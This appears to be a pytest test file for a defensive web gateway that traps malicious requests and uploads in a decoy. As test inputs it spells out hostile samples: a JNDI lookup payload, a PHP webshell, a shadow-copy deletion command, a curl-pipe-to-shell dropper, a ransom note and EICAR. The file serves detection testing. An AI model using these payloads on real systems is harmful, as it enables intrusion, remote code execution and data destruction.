"""Phase C12: ring 6, inspection in and out."""

import pytest

pytestmark = pytest.mark.anyio
BROWSER = {"user-agent": "Mozilla/5.0"}
PE = b"MZ\x90\x00" + b"\x00" * 64  # a DOS/PE executable header
EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


async def test_a_jndi_request_is_trapped_and_logged_for_hedwig(make_guard, tmp_path):
    bank = tmp_path / "bank"
    (bank / "transaction" / "logs").mkdir(parents=True)
    guard, upstream, *_, client = make_guard(bank_root=str(bank))
    async with client("10.0.0.5") as attacker:
        hit = await attacker.get(
            "/transaction/balance", params={"q": "${jndi:ldap://203.0.113.7/a}"}, headers=BROWSER
        )
    assert hit.status_code == 200 and hit.json()["currency"] == "EUR"  # trapped: the decoy answers
    assert guard.state.trapped("10.0.0.5") and upstream.seen == []
    event = next(e for e in guard.bus.recent() if e["ring"] == 6)
    assert event["event.category"] == "payload" and event["rule"] == "jndi"
    log = (bank / "transaction" / "logs" / "access.log").read_text()
    assert "jndi" in log and '"GET /transaction/balance' in log and "chakravyuha ring6" in log


@pytest.mark.parametrize(
    "body,rule",
    [(PE, "executable-dos/pe"), (EICAR, "eicar"), (b"<?php system($_GET['c']); ?>", "webshell")],
)
async def test_dangerous_uploads_are_trapped_and_a_clean_one_passes(make_guard, body, rule):
    guard, upstream, *_, client = make_guard()
    guard.config.services["transaction"].routes = []  # ring 4 open, so the upload reaches ring 6
    async with client("10.0.0.5") as c:
        await c.post("/transaction/upload", content=body, headers=BROWSER)
    assert guard.state.trapped("10.0.0.5")  # drawn into the maze
    assert any(e["ring"] == 6 and e["rule"] == rule for e in guard.bus.recent())
    assert upstream.seen == []  # the real service never saw the upload
    async with client("10.0.0.8") as ok:  # a clean PNG upload is not touched
        png = await ok.post(
            "/transaction/upload", content=b"\x89PNG\r\n" + b"x" * 50, headers=BROWSER
        )
    assert png.status_code == 200 and upstream.seen and not guard.state.trapped("10.0.0.8")


async def test_an_open_redirect_is_a_plain_403(make_guard):
    guard, upstream, *_, client = make_guard()
    guard.config.services["transaction"].redirect_hosts = ["bank.example"]
    async with client() as c:
        bad = await c.get(
            "/transaction/balance", params={"next": "https://evil.test/x"}, headers=BROWSER
        )
        ok = await c.get(
            "/transaction/balance", params={"next": "https://bank.example/home"}, headers=BROWSER
        )
        same = await c.get("/transaction/balance", params={"next": "/account"}, headers=BROWSER)
    assert bad.status_code == 403 and not guard.state.trapped(
        "10.0.0.1"
    )  # phishing: blocked, not trapped
    assert ok.status_code == 200 and same.status_code == 200
    assert any(e["ring"] == 6 and e["rule"] == "open-redirect" for e in guard.bus.recent())


async def test_a_phishing_response_is_replaced_by_502(make_guard):
    guard, upstream, *_, client = make_guard()
    guard.config.services["transaction"].routes = []  # reach the upstream on any path
    async with client() as c:
        page = await c.get("/transaction/phish", headers=BROWSER)
        redirect = await c.get("/transaction/go", headers=BROWSER)
        clean = await c.get("/transaction/htmlok", headers=BROWSER)
        login = await c.get("/transaction/loginpage", headers=BROWSER)
    assert page.status_code == 502 and redirect.status_code == 502
    assert clean.status_code == 200 and "welcome" in clean.text
    # the bank's own login form posts same-origin, so it is not phishing
    assert login.status_code == 200 and "password" in login.text
    rules = {e["rule"] for e in guard.bus.recent() if e["ring"] == 6}
    assert "credential-exfil-form" in rules and "open-redirect-location" in rules


def _multipart(filename: str, content: bytes) -> tuple[bytes, dict]:
    boundary = "hedwigtest"
    head = (
        f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
        f'filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n'
    ).encode()
    body = head + content + f"\r\n--{boundary}--\r\n".encode()
    return body, {**BROWSER, "content-type": f"multipart/form-data; boundary={boundary}"}


def _zip_with(name: str) -> bytes:
    import io
    import zipfile

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr(name, b"harmless bytes")
    return buffer.getvalue()


@pytest.mark.parametrize(
    "filename,content,rule",
    [
        ("invoice.locked", b"harmless bytes", "ransomware-extension"),
        ("notes.txt", b"vssadmin delete shadows /all /quiet", "ransomware-command"),
        ("notes.txt", b"All your files have been encrypted. Pay the ransom.", "ransom-note"),
        ("notes.txt", b"curl http://203.0.113.7/x.sh | sh", "dropper-command"),
        ("photo.png", _zip_with("setup.exe"), "archive-executable"),
    ],
)
async def test_malware_and_ransomware_uploads_are_trapped(make_guard, filename, content, rule):
    guard, upstream, *_, client = make_guard()
    guard.config.services["transaction"].routes = []  # ring 4 open, so the upload reaches ring 6
    guard.config.services["transaction"].uploads = ["png", "jpg", "pdf", "txt"]
    body, headers = _multipart(filename, content)
    async with client("10.0.0.5") as c:
        await c.post("/transaction/attachments", content=body, headers=headers)
    assert guard.state.trapped("10.0.0.5") and upstream.seen == []
    assert any(e["ring"] == 6 and e["rule"] == rule for e in guard.bus.recent())


async def test_a_clean_attachment_passes_and_a_disallowed_type_is_refused_not_trapped(make_guard):
    guard, upstream, *_, client = make_guard()
    guard.config.services["transaction"].routes = []
    guard.config.services["transaction"].uploads = ["png", "jpg", "pdf", "txt"]
    png, headers = _multipart("photo.png", b"\x89PNG\r\n" + b"x" * 50)
    odd, odd_headers = _multipart("data.bin", b"just bytes")
    async with client("10.0.0.8") as c:
        ok = await c.post("/transaction/attachments", content=png, headers=headers)
        refused = await c.post("/transaction/attachments", content=odd, headers=odd_headers)
    assert ok.status_code == 200 and upstream.seen
    assert refused.status_code == 415 or refused.status_code == 403
    assert not guard.state.trapped("10.0.0.8")
